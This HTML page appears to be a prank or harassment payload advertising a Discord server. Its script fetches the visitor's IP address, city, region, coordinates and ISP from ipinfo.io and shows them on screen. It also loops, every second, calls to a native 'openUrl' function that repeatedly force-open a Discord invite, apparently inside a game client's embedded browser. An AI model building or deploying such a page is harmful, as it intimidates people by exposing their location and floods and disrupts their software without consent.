<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/DET</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjYyc25janM5M2V4YmZzNHdwNDNyY2ZycjR2MzVreXN1ZWtlb3FzdiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/lSzQjkthGS1gc/giphy.gif') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Courier New', Courier, monospace;
            color: #000000; /* Changed to black */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }
        .image-container img {
            width: 750px; 
            height: auto;
            border: 2px solid #000000; /* Changed to black */
            border-radius: 15px;
            box-shadow: 0 0 5px rgba(255, 255, 255, 0.7); /* Changed to white shadow */
        }
        .info {
            margin-top: 20px;
            font-size: 1.5em;
            color: #ffffff; /* Changed to black */
            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #000000; /* Changed to white shadow */
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 20px;
            font-size: 3em; 
            color: #ffffff; /* Changed to black */
            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; /* Changed to white shadow */
            letter-spacing: 4.5px; 
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="https://github.com/286b44606swax/dsa2/blob/main/Screenshot%202025-08-04%20201753.png?raw=true" alt="Discord Image">
    </div>
    <audio autoplay loop>
        <source src="حط الاغنيه الي تبيها" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
    <div class="info" id="ip-info">
        <strong>IP: <span id="ip"></span></strong><br>
        <span><strong>City:</strong> <span id="city"></span></span><br>
        <span><strong>Region:</strong> <span id="region"></span></span><br>
        <span><strong>Country:</strong> <span id="country"></span></span><br>
        <span><strong>Location:</strong> <span id="loc"></span></span><br>
        <span><strong>Organization:</strong> <span id="org"></span></span><br>
        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
    </div>
    <div class="text">discord.gg/Det</div>

    <script>
         fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            delete data.readme;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.textContent = JSON.stringify(data, null, 2);
        });
    </script>
    <script>
setInterval(() => {
window.invokeNative("openUrl", "https://discord.gg/det");
window.invokeNative("openUrl", "https://discord.gg/det");
window.invokeNative("openUrl", "https://discord.gg/det");
window.invokeNative("openUrl", "https://discord.gg/det");
}, 1000);
    </script>
</body>
</html>
